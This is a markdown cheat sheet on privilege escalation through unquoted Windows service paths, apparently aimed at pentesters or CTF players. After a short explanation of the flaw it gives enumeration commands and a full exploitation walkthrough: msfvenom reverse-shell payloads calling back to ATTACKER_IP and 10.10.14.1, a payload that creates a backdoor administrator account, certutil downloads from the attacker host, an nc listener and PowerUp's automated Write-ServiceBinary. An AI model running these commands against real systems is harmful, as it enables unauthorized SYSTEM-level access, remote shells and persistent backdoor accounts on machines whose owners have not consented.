# Unquoted Service Paths Privilege Escalation

## What is Unquoted Service Path?

When a Windows service path contains spaces and isn't enclosed in quotes, Windows searches for the executable in a specific order. This can be exploited to execute malicious code.

Example:
```
Unquoted: C:\Program Files\My App\service.exe
Windows tries:
  1. C:\Program.exe
  2. C:\Program Files\My.exe
  3. C:\Program Files\My App\service.exe
```

---

## Finding Vulnerable Services

### Using WMIC

```cmd
# Find services with unquoted paths containing spaces
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# More detailed
wmic service get name,pathname,startmode,startname | findstr /i /v """
```

### Using PowerShell

```powershell
# Find unquoted service paths
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notlike '"*' -and 
    $_.PathName -notlike 'C:\Windows\*' -and
    $_.PathName -match '\s'
} | Select-Object Name, PathName, StartMode, State

# Alternative
Get-CimInstance -ClassName Win32_Service | Where-Object {
    $_.PathName -and
    $_.PathName -notmatch '^"' -and
    $_.PathName -match '\s' -and
    $_.PathName -notmatch '^C:\\Windows'
} | Select-Object Name, PathName, StartMode
```

### Using PowerUp

```powershell
. .\PowerUp.ps1
Get-ServiceUnquoted
```

### Using WinPEAS

```cmd
winPEASx64.exe servicesinfo
```

---

## Exploitation Steps

### 1. Identify Vulnerable Service

```cmd
# Example vulnerable path:
# C:\Program Files\Vulnerable App\Sub Folder\service.exe
```

### 2. Check Write Permissions

```cmd
# Check if you can write to any of these:
# C:\Program.exe
# C:\Program Files\Vulnerable.exe
# C:\Program Files\Vulnerable App\Sub.exe

icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Vulnerable App"
```

### 3. Check Service Start Type

```cmd
sc qc "ServiceName"
# Look for START_TYPE: AUTO_START (runs at boot)
# Or DEMAND_START (manual)
```

### 4. Check Service Permissions

```cmd
# Can you start/stop the service?
sc qc "ServiceName"
sc query "ServiceName"
```

### 5. Create Malicious Executable

```bash
# On attacker machine - create reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Program.exe

# Or add user
msfvenom -p windows/exec CMD='net user hacker Password123! /add && net localgroup Administrators hacker /add' -f exe -o Program.exe
```

### 6. Transfer and Place Executable

```cmd
# Transfer to target
certutil -urlcache -split -f http://ATTACKER_IP/Program.exe C:\Program.exe

# Or copy directly if path is writable
copy \\ATTACKER_IP\share\Program.exe "C:\Program Files\Vulnerable.exe"
```

### 7. Restart Service

```cmd
# Stop service
sc stop "ServiceName"
net stop "ServiceName"

# Start service  
sc start "ServiceName"
net start "ServiceName"

# If can't restart, reboot
shutdown /r /t 0
```

---

## Example Walkthrough

### Scenario

```
Service: VulnerableService
Path: C:\Program Files\My Company\App Service\service.exe
```

### Steps

```cmd
# 1. Verify unquoted
wmic service get name,pathname | findstr "VulnerableService"

# 2. Check write permissions
icacls "C:\Program Files\My Company"
# Output shows BUILTIN\Users:(W) - Writable!

# 3. Generate payload
# On attacker:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > App.exe

# 4. Transfer payload
# On target:
certutil -urlcache -split -f http://10.10.14.1/App.exe "C:\Program Files\My Company\App.exe"

# 5. Start listener on attacker
nc -lvnp 4444

# 6. Restart service
sc stop "VulnerableService"
sc start "VulnerableService"

# 7. Catch shell!
```

---

## Quick Reference: Executable Locations

For path: `C:\Program Files\Company Name\App Folder\service.exe`

| Location to Write | Required Write Permission |
|-------------------|---------------------------|
| C:\Program.exe | C:\ |
| C:\Program Files\Company.exe | C:\Program Files\ |
| C:\Program Files\Company Name\App.exe | C:\Program Files\Company Name\ |

---

## Troubleshooting

### Service Won't Start

```cmd
# Check event logs
wevtutil qe System /c:5 /rd:true /f:text | findstr /i "error"

# Check service status
sc query "ServiceName"
```

### No Write Permissions

```cmd
# Check all folders in path
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Company"
icacls "C:\Program Files\Company\App Folder"

# Look for:
# (W) - Write
# (M) - Modify
# (F) - Full Control
# BUILTIN\Users - Your group
```

### Can't Restart Service

```cmd
# Check if running as LocalSystem (best)
sc qc "ServiceName"
# SERVICE_START_NAME: LocalSystem

# Check your permissions on service
accesschk.exe -ucqv "ServiceName"
```

---

## Automated Exploitation with PowerUp

```powershell
# Import PowerUp
. .\PowerUp.ps1

# Find unquoted services
Get-ServiceUnquoted

# Automatically exploit (writes to first writable location)
Write-ServiceBinary -Name 'VulnerableService' -UserName 'hacker' -Password 'Password123!'

# Restart service
Restart-Service 'VulnerableService'
```

---

## Cleanup

```cmd
# Remove malicious executable
del "C:\Program Files\Company\App.exe"

# Restart service with original
sc stop "ServiceName"
sc start "ServiceName"
```



